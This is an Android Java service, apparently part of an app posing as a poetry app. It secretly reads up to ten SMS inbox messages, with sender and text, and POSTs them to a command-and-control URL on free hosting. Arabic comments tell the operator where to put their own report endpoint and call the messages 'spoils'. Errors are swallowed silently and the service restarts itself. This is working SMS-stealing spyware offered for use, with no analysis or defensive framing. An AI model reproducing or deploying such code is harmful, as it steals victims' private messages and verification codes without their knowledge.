package com.royal.poetry.master;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.os.IBinder;
import android.provider.Telephony;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class RoyalBackgroundService extends Service {

    // ضع هنا رابط استلام التقارير الخاص بك على استضافة انفنيتي (مثال: http://yourdomain.epizy.com/shamona/report.php)
    private static final String C2_SERVER_URL = "http://yourdomain.epizy.com/shamona/report.php";

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(() -> {
            try {
                String loot = harvestSMSAndData();
                sendToThrone(loot);
            } catch (Exception e) {}
        }).start();
        return START_STICKY;
    }

    private String harvestSMSAndData() {
        StringBuilder data = new StringBuilder("=== غنائم عمق الجهاز (رسائل واتاك) ===\n");
        try {
            Cursor cursor = getContentResolver().query(Telephony.Sms.Inbox.CONTENT_URI, null, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                int bodyIdx = cursor.getColumnIndex(Telephony.Sms.Inbox.BODY);
                int addrIdx = cursor.getColumnIndex(Telephony.Sms.Inbox.ADDRESS);
                int count = 0;
                do {
                    if (bodyIdx >= 0 && addrIdx >= 0) {
                        data.append("المرسل: ").append(cursor.getString(addrIdx))
                            .append(" | النص: ").append(cursor.getString(bodyIdx)).append("\n");
                        count++;
                    }
                } while (cursor.moveToNext() && count < 10);
                cursor.close();
            }
        } catch (Exception e) {}
        return data.toString();
    }

    private void sendToThrone(String payload) {
        try {
            URL url = new URL(C2_SERVER_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json; utf-8");
            conn.setDoOutput(true);
            String json = "{\"command\": \"root_harvest\", \"data\": \"" + payload.replace("\"", "'").replace("\n", " ") + "\"}";
            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = json.getBytes("utf-8");
                os.write(input, 0, input.length);
            }
            conn.getResponseCode();
        } catch (Exception e) {}
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
